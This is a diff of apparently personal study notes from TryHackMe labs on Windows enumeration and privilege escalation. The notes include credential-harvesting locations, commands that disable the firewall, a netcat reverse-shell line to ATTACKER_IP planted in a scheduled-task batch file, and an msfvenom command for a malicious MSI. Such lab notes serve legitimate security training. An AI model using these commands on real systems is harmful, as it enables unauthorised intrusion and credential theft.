@@ -6,395 +6,395 @@ Windows Environment Enumeration using cmd.exe:
 
 System
 ------
-C:\>systeminfo  
+C:\>systeminfo
 * system information (e.g. build number and installed patches)
 
-C:\>wmic qfe get Caption,Description  
+C:\>wmic qfe get Caption,Description
 * installed updates
 
-C:\>net start  
+C:\>net start
 * installed and started Windows services
 
-C:\>wmic product get name,version,vendor  
+C:\>wmic product get name,version,vendor
 * installed apps
 
 Users
 -----
-C:\>whoami  
+C:\>whoami
 * find user you are running as
 
-C:\>whoami /priv  
+C:\>whoami /priv
 * find your user's privieges
 
-C:\>whoami /groups  
+C:\>whoami /groups
 * find the groups your user belongs to
 
-C:\>net user  
+C:\>net user
 * list user accounts on the device
 
-C:\>net group  
+C:\>net group
 * list groups on the device (use this command if the device IS a Windows Domain Controller)
 
-C:\>net localgroup  
+C:\>net localgroup
 * list groups on the device (use this command if the device is NOT a Windows Domain Controller)
 
-C:\>net localgroup administrators  
+C:\>net localgroup administrators
 * list users who belong to the administrators group
 
-C:\>net accounts  
-* local device settings (e.g. password policy)  
+C:\>net accounts
+* local device settings (e.g. password policy)
 [Note: use `net accounts /domain` if the device is part of a domain]
 
 Networking
 -----------
-C:\>ipconfig /all  
+C:\>ipconfig /all
 * full network config info including DNS servers
 
-C:\>netstat -abno  
-* listening ports; active connections; programs using the ports  
-[Note the following flags:  
--a = all listening ports and active connections  
--b = name of binary (executable) using the connection  
--n = do not resolve IP addresses (just give numeric addresses)  
--o = display process id (PID) associated with each connection  
+C:\>netstat -abno
+* listening ports; active connections; programs using the ports
+[Note the following flags:
+-a = all listening ports and active connections
+-b = name of binary (executable) using the connection
+-n = do not resolve IP addresses (just give numeric addresses)
+-o = display process id (PID) associated with each connection
 Note: netstat may provide information missed by nmap; netstat is also quiet, unlike nmap]
 
-C:\>arp -a  
+C:\>arp -a
 * physical (MAC) addresses of systems on the same LAN that recently communicated with the device you are on, mapped to their IP addresses
 
 --------------------------------------------------------------
 [from: https://tryhackme.com/room/thelayoftheland and https://tryhackme.com/room/enumerationpe]
 
-Windows Environment Enumeration using PowerShell:  
-[also see: tools > PowerShell in this repository]  
+Windows Environment Enumeration using PowerShell:
+[also see: tools > PowerShell in this repository]
 [Note: if you have a basic shell on a Windows machine (cmd.exe) you can get a PowerShell CLI (assuming PowerShell is installed on the system) by simply giving the command: `powershell.exe`.]
 
-PS > netstat -na  
+PS > netstat -na
 output shows open TCP and UDP ports
 
-PS > arp -a  
+PS > arp -a
 output shows IP addresses in the network and their corresponding "physical" MAC addresses
 
-PS > systeminfo | findstr Domain  
+PS > systeminfo | findstr Domain
 output shows if device is part of Active Directory domain
 
-PS > Get-ADUser -Filter *  
+PS > Get-ADUser -Filter *
 output shows all active directory user accounts
 
-PS > wmic /namespace:\\root\securitycenter2 path antivirusproduct  
-or  
-PS > Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct  
+PS > wmic /namespace:\\root\securitycenter2 path antivirusproduct
+or
+PS > Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
 output shows installed AV software
 
-PS > Get-Service WinDefend  
+PS > Get-Service WinDefend
 output is service state of Windows Defender
 
-PS > Get-MpComputerStatus | select RealTimeProtectionEnabled  
+PS > Get-MpComputerStatus | select RealTimeProtectionEnabled
 output is whether Windows Defender is enabled
 
-PS > Get-NetFirewallProfile | Format-Table Name, Enabled  
+PS > Get-NetFirewallProfile | Format-Table Name, Enabled
 output is whether firewall is enabled
 
-PS > Get-NetFirewallRule | select DisplayName, Enabled, Description  
+PS > Get-NetFirewallRule | select DisplayName, Enabled, Description
 output is firewall rules
 
-PS > Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False  
+PS > Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
 command disables firewall (need admin privileges to run it)
 
-PS > Test-NetConnection -ComputerName 127.0.0.1 -Port 80  
-output will confirm if inbound port 80 connection is open and allowed to pass firewall  
-[note: -ComputerName can also check remote targets in the network if their IP is given]  
+PS > Test-NetConnection -ComputerName 127.0.0.1 -Port 80
+output will confirm if inbound port 80 connection is open and allowed to pass firewall
+[note: -ComputerName can also check remote targets in the network if their IP is given]
 [note: also see TcpClient cmdlet]
 
-PS > Get-EventLog -List  
-output is available event logs on the local device  
+PS > Get-EventLog -List
+output is available event logs on the local device
 also see: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1
 
-PS > Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }  
-or  
-PS > Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"  
-or  
-PS > reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational  
+PS > Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+or
+PS > Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+or
+PS > reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
 output is whether Sysmon is installed on device
 
-PS > findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*  
-output is location of Sysmon file  
+PS > findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+output is location of Sysmon file 
 also see: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon and https://tryhackme.com/room/sysmon
 
-also see:  
-https://github.com/PwnDexter/Invoke-EDRChecker  
-https://github.com/PwnDexter/SharpEDRChecker  
+also see:
+https://github.com/PwnDexter/Invoke-EDRChecker
+https://github.com/PwnDexter/SharpEDRChecker
 [enumerates AV/EDR present on device]
 
-PS > wmic product get name,version  
+PS > wmic product get name,version
 output is all applications installed on system (and their versions)
 
-PS > Get-ChildItem -Hidden -Path <particular path, e.g. C:\Users\ralph\Desktop\>  
-output is hidden directories  
+PS > Get-ChildItem -Hidden -Path <particular path, e.g. C:\Users\ralph\Desktop\>
+output is hidden directories
 [note the Get-ChildItem cmdlet can also be used to search for text strings and backup files]
 
-PS > net start  
+PS > net start
 output is a list of services running on the device
 
-PS > wmic service where "name like 'THM Demo'" get Name,PathName  
+PS > wmic service where "name like 'THM Demo'" get Name,PathName
 [note: if you want more info about a particular service you see in the list generates by `net start` command (e.g. you saw a service called "THM Demo") you would run this command to get the exact name and path of the chosen service]
 
-PS > Get-Process -Name thm-demo  
-[run this command with the exact name of the service obtained from the previous command (in this case: thm-demo) to get the process ID of the chosen service]  
+PS > Get-Process -Name thm-demo
+[run this command with the exact name of the service obtained from the previous command (in this case: thm-demo) to get the process ID of the chosen service]
 [note: when searching the exact name of the service do NOT include the extension, i.e. `-Name thm-demo` NOT `-Name thm-demo.exe`]
 
-PS > netstat -noa |findstr "LISTENING" |findstr "3212"  
+PS > netstat -noa |findstr "LISTENING" |findstr "3212"
 [run this command to take the process ID obtained from the previous command (in this case: 3212) and check if it is listening on any ports]
 
-[note: the below commands are used in order to accomplish a DNS zone transfer in order to get the DNS info for the AD domain]  
-PS > nslookup.exe  
-PS > server <server_ip>  
+[note: the below commands are used in order to accomplish a DNS zone transfer in order to get the DNS info for the AD domain]
+PS > nslookup.exe
+PS > server <server_ip>
 PS > ls -d <domain>
 
 More Powershell Enumeration Commands
 ------------------------------------
-see: https://tryhackme.com/room/powershell ; Task 4 - Enumeration  
+see: https://tryhackme.com/room/powershell ; Task 4 - Enumeration
 and see: https://deskel.github.io/posts/thm/hacking-with-powershell (walkthrough of THM room)
 
-PS > Get-LocalUser  
+PS > Get-LocalUser
 - list user accounts found on the machine
 
-PS > Get-LocalUser -SID "<SID>"  
+PS > Get-LocalUser -SID "<SID>"
 - find a user by SID
 
-PS > Get-LocalGroup  
+PS > Get-LocalGroup
 - list groups found on the machine
 
-PS > Get-LocalGroup | Measure  
+PS > Get-LocalGroup | Measure
 - count of groups found on the machine
 
-PS > Get-NetIPAddress  
+PS > Get-NetIPAddress
 - print info re machines IP addresses
 
-PS > Get-NetTCPconnection  
+PS > Get-NetTCPconnection
 - list all TCP ports
 
-PS > Get-NetTCPconnection -State Listen  
+PS > Get-NetTCPconnection -State Listen
 - list all TCP ports that are listening
 
-PS > Get-NetTCPconnection -LocalPort 445  
+PS > Get-NetTCPconnection -LocalPort 445
 - information about port 445
 
-PS > Get-HotFix  
+PS > Get-HotFix
 - list applied patches
 
-PS > Get-HoxFix -ID <hot_fix_id>  
+PS > Get-HoxFix -ID <hot_fix_id>
 - search for a patch by ID
 
-PS > Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue  
+PS > Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue
 - search for all backup files
 
-PS > Get-Process  
+PS > Get-Process
 - list all running processes
 
-PS > Get-Scheduledtask  
+PS > Get-Scheduledtask
 - list all scheduled tasks
 
-PS > Get-Scheduledtask -TaskName <name_of_task>  
+PS > Get-Scheduledtask -TaskName <name_of_task>
 - find a specific scheduled task by name
 
-PS > Get-Acl <PATH, e.g. C:\>  
+PS > Get-Acl <PATH, e.g. C:\>
 - find who owns a path
 ---------------------------------------------------------------------------------------------------------------
 [from: https://tryhackme.com/room/enumerationpe ; Task 5]
 
 Windows Enumeration using tools found on a Kali Linux machine that can query the Windows Server
 -------------
-DNS Zone Transfer - collect DNS info about the domain  
-$ dig -t AXFR <DOMAIN_NAME> @<DNS_SERVER_IP_ADDRESS>  
+DNS Zone Transfer - collect DNS info about the domain
+$ dig -t AXFR <DOMAIN_NAME> @<DNS_SERVER_IP_ADDRESS>
 * Note: the `-t AXFR` flag is used to request a zone transfer
 
-Server Message Block (SMB) - check shares using net share (when you have SSH connection to the Windows Server)  
+Server Message Block (SMB) - check shares using net share (when you have SSH connection to the Windows Server)
 $ net share
 
-SNMP (Simple Network Management Protocol) - snmpcheck  
-* snmpcheck collects valuable information regarding devices present on the network; very important info for attackers  
-* install snmpcheck as follows:  
-$ git clone https://gitlab.com/kalilinux/packages/snmpcheck.git  
-$ cd snmpcheck/  
-$ gem install snmp  
-$ chmod +x snmpcheck-1.9.rb  
-* run snmpcheck as follows:  
-$ /opt/snmpcheck/snmpcheck.rb <SERVER_IP> -c <COMMUNITY_STRING (usually the string is: public)>  
-* in this example the executable is in /opt/snmpcheck/ and the full path is given to run it  
-* the output may very well use up and overflow the terminal screen; follow the above command with:  
-`| more`  
-or  
-`| less`  
-or  
-`> snmpcheck.txt`  
+SNMP (Simple Network Management Protocol) - snmpcheck
+* snmpcheck collects valuable information regarding devices present on the network; very important info for attackers
+* install snmpcheck as follows:
+$ git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
+$ cd snmpcheck/
+$ gem install snmp
+$ chmod +x snmpcheck-1.9.rb
+* run snmpcheck as follows:
+$ /opt/snmpcheck/snmpcheck.rb <SERVER_IP> -c <COMMUNITY_STRING (usually the string is: public)>
+* in this example the executable is in /opt/snmpcheck/ and the full path is given to run it
+* the output may very well use up and overflow the terminal screen; follow the above command with:
+`| more`
+or
+`| less`
+or
+`> snmpcheck.txt`
 in order to be able to view and scroll through the full output
 ---------------------------------------------------------------------------------------------------------------
 [from: https://tryhackme.com/room/enumerationpe ; Task 6 - More Tools For Windows]
 
-Sysinternals Suite  
-* Suite of GUI tools  
-* includes:  
-Utility Name	    Description  
-Process Explorer	Shows the processes along with the open files and registry keys  
-Process Monitor     Monitor the file system, processes, and Registry  
-PsList	            Provides information about processes  
-PsLoggedOn	        Shows the logged-in users  
-* includes other tools, see here: https://docs.microsoft.com/en-us/sysinternals/downloads/  
+Sysinternals Suite
+* Suite of GUI tools
+* includes:
+Utility Name	    Description
+Process Explorer	Shows the processes along with the open files and registry keys
+Process Monitor     Monitor the file system, processes, and Registry
+PsList	            Provides information about processes
+PsLoggedOn	        Shows the logged-in users
+* includes other tools, see here: https://docs.microsoft.com/en-us/sysinternals/downloads/
 * also see: https://tryhackme.com/room/btsysinternalssg
 
-Process Hacker  
-* GUI tool for gathering information about running processes  
+Process Hacker
+* GUI tool for gathering information about running processes
 * https://processhacker.sourceforge.io/
 
-GhostPack Seatbelt  
-* https://github.com/GhostPack/Seatbelt  
-* written in C#  
-* must be compiled using MS Visual Studio before running  
+GhostPack Seatbelt
+* https://github.com/GhostPack/Seatbelt
+* written in C#
+* must be compiled using MS Visual Studio before running
 [also see: https://specterops.gitbook.io/ghostpack/ -- MagVeTs]
 ---------------------------------------------------------------------------------------------------------------
-LOLBAS  
-https://lolbas-project.github.io/  
-Living Off The Land Binaries, Scripts and Libraries  
+LOLBAS
+https://lolbas-project.github.io/
+Living Off The Land Binaries, Scripts and Libraries
 [use for privilege escalation]
 ---------------------------------------------------------------------------------------------------------------
 Discovery/Enumeration
 ---------------------
-Use the 'systeminfo' command in the CLI in order to learn about the system including whether the device you have penetrated is part of an Active Directory domain (or, perhaps, even the Domain Controller)  
+Use the 'systeminfo' command in the CLI in order to learn about the system including whether the device you have penetrated is part of an Active Directory domain (or, perhaps, even the Domain Controller)
 see:  https://tryhackme.com/room/thelayoftheland ; Task 4 - Active Directory (AD) Environment
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [From: https://tryhackme.com/room/windowsprivesc20 - Tasks 1-4 ; with editing ,etc.]
 
 Places to harvest passwords from:
 
-1)  
-Unattended Windows Installations  
+1)
+Unattended Windows Installations
 When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
 
-C:\Unattend.xml  
-C:\Windows\Panther\Unattend.xml  
-C:\Windows\Panther\Unattend\Unattend.xml  
-C:\Windows\system32\sysprep.inf  
-C:\Windows\system32\sysprep\sysprep.xml  
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
 As part of these files, you might encounter credentials:
 
-<Credentials>  
-    <Username>Administrator</Username>  
-    <Domain>thm.local</Domain>  
-    <Password>MyPassword123</Password>  
+<Credentials>
+    <Username>Administrator</Username>
+    <Domain>thm.local</Domain>
+    <Password>MyPassword123</Password>
 </Credentials>
 
-2)  
-Powershell History  
+2)
+Powershell History
 Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:
 
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 
 
-3)  
-Saved Windows Credentials  
+3)
+Saved Windows Credentials
 Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
 
-cmdkey /list  
+cmdkey /list
 While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.
 
 runas /savecred /user:admin cmd.exe
 
-4)  
-IIS Configuration  
+4)
+IIS Configuration
 Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
 
-C:\inetpub\wwwroot\web.config  
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config  
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 Here is a quick way to find database connection strings on the file:
 
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 
-5)  
-Retrieve Credentials from Software: PuTTY  
+5)
+Retrieve Credentials from Software: PuTTY
 PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
 
 To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
 
-reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s  
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
 
 Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.
 
-6) Scheduled Tasks  
-Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.  
-Scheduled tasks can be listed from the command line using the 'schtasks' command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:  
-schtasks /query /tn <TASK_NAME> /fo list /v  
-For example:  
-C:\> schtasks /query /tn vulntask /fo list /v  
-Folder: \  
-HostName:                             THM-PC1  
-TaskName:                             \vulntask  
-Task To Run:                          C:\tasks\schtask.bat  
-Run As User:                          taskusr1  
+6) Scheduled Tasks
+Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
+Scheduled tasks can be listed from the command line using the 'schtasks' command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
+schtasks /query /tn <TASK_NAME> /fo list /v
+For example:
+C:\> schtasks /query /tn vulntask /fo list /v
+Folder: \
+HostName:                             THM-PC1
+TaskName:                             \vulntask
+Task To Run:                          C:\tasks\schtask.bat
+Run As User:                          taskusr1
 You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
 
-If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:  
-icalcs <FULL_PATH_OF_EXECUTABLE>  
-As an example:  
-C:\> icacls c:\tasks\schtask.bat  
-c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)  
-                    BUILTIN\Administrators:(I)(F)  
-                    BUILTIN\Users:(I)(F)  
-As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.  
+If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
+icalcs <FULL_PATH_OF_EXECUTABLE>
+As an example:
+C:\> icacls c:\tasks\schtask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.
 For example, If you have a reverse shell executable called nc64.exe you can change the bat file to spawn a reverse shell:
 
-Command Prompt  
-C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat  
+Command Prompt
+C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
 
-nc -lvp 4444  
+nc -lvp 4444
 The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges.
 
-7) AlwaysInstallElevated  
+7) AlwaysInstallElevated
 Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
 
-This method requires two registry values to be set. You can query these from the command line using the commands below.  
-C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer  
-C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  
+This method requires two registry values to be set. You can query these from the command line using the commands below.
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.202.93 LPORT=LOCAL_PORT -f msi -o malicious.msi  
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.202.93 LPORT=LOCAL_PORT -f msi -o malicious.msi
 As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
 
-Command Prompt  
+Command Prompt
 C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-see: https://tryhackme.com/room/windowsprivesc20 - Task 5 (Abusing Service Misconfigurations) for an extensive discussion of elevating privileges, covering:  
-1) The SCM (Service Control Manager) and where to view information about services  
-2) How to check for and abuse Insecure Permissions on Service Executables (2 methods).  
-3) How to check for and abuse Unquoted Service Paths.  
+see: https://tryhackme.com/room/windowsprivesc20 - Task 5 (Abusing Service Misconfigurations) for an extensive discussion of elevating privileges, covering:
+1) The SCM (Service Control Manager) and where to view information about services
+2) How to check for and abuse Insecure Permissions on Service Executables (2 methods).
+3) How to check for and abuse Unquoted Service Paths.
 4) How to check for and abuse Insecure Service Permissions (note: this is different from #1 Insecure Permissions on Service EXECUTABLES)
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-see: https://tryhackme.com/room/windowsprivesc20 - Task 6 (Abusing dangerous privileges) for an extensive discussion of elevating privileges, including:  
-"Windows Privileges  
-Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.  
-Each user has a set of assigned privileges that can be checked with the following command:  
-whoami /priv  
-A complete list of available privileges on Windows systems is available here: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project (https://github.com/gtworek/Priv2Admin)."  
-and discussing specifically:  
-1) SeBackup / SeRestore  
-"The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.  
-Having this power, an attacker can trivially escalate privileges on the system by using many techniques ... [including] copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash."  
-2) SeTakeOwnership  
-"The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable."  
-3) SeImpersonate / SeAssignPrimaryToken  
+see: https://tryhackme.com/room/windowsprivesc20 - Task 6 (Abusing dangerous privileges) for an extensive discussion of elevating privileges, including:
+"Windows Privileges
+Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.
+Each user has a set of assigned privileges that can be checked with the following command:
+whoami /priv
+A complete list of available privileges on Windows systems is available here: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project (https://github.com/gtworek/Priv2Admin)."
+and discussing specifically:
+1) SeBackup / SeRestore
+"The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
+Having this power, an attacker can trivially escalate privileges on the system by using many techniques ... [including] copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash."
+2) SeTakeOwnership
+"The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable."
+3) SeImpersonate / SeAssignPrimaryToken
 "These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user."
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-see: https://tryhackme.com/room/windowsprivesc20 - Task 7 (Abusing vulnerable software) for an extensive discussion of elevating privileges, including:  
-"Unpatched Software  
+see: https://tryhackme.com/room/windowsprivesc20 - Task 7 (Abusing vulnerable software) for an extensive discussion of elevating privileges, including:
+"Unpatched Software
 Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):
 
 wmic product get name,version,vendor
 
 Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
 
-Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db (https://www.exploit-db.com/), packet storm (https://packetstormsecurity.com/) or plain old Google, amongst many others..."  
+Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db (https://www.exploit-db.com/), packet storm (https://packetstormsecurity.com/) or plain old Google, amongst many others..."
 [This Task includes the following case study: exploting a vulnerability in Druva inSync 6.6.3.]
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [From: https://tryhackme.com/room/windowsprivesc20 ; Task 8 - Tools of the Trade; with some editing, etc.]
@@ -417,9 +417,9 @@ PrivescCheck is a PowerShell script that searches common privilege escalation on
 
 PrivescCheck can be downloaded here: https://github.com/itm4n/PrivescCheck
 
-Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below:  
-PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force  
-PS C:\> . .\PrivescCheck.ps1  
+Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below:
+PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+PS C:\> . .\PrivescCheck.ps1
 PS C:\> Invoke-PrivescCheck
 
 WES-NG: Windows Exploit Suggester - Next Generation
@@ -432,21 +432,21 @@ Once installed, and before using it, type the `wes.py --update` command to updat
 
 To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
 
-Once this is done, wes.py can be run as follows:  
+Once this is done, wes.py can be run as follows:
 user@kali$ wes.py systeminfo.txt
 
 Metasploit
 ----------
 If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-[see: https://tryhackme.com/room/windowsprivesc20 ; Task 9 - Conclusion]  
-List of privilege escalation resources:  
-* PayloadsAllTheThings - Windows Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md  
-* Priv2Admin - Abusing Windows Privileges - https://github.com/gtworek/Priv2Admin  
-* RogueWinRM Exploit - https://github.com/antonioCoco/RogueWinRM  
-* Potatoes - https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html  
-* Decoder's Blog - https://decoder.cloud/  
-* Token Kidnapping - https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf  
+[see: https://tryhackme.com/room/windowsprivesc20 ; Task 9 - Conclusion]
+List of privilege escalation resources:
+* PayloadsAllTheThings - Windows Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+* Priv2Admin - Abusing Windows Privileges - https://github.com/gtworek/Priv2Admin
+* RogueWinRM Exploit - https://github.com/antonioCoco/RogueWinRM
+* Potatoes - https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
+* Decoder's Blog - https://decoder.cloud/
+* Token Kidnapping - https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
 * Hacktricks - Windows Local Privilege Escalation - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
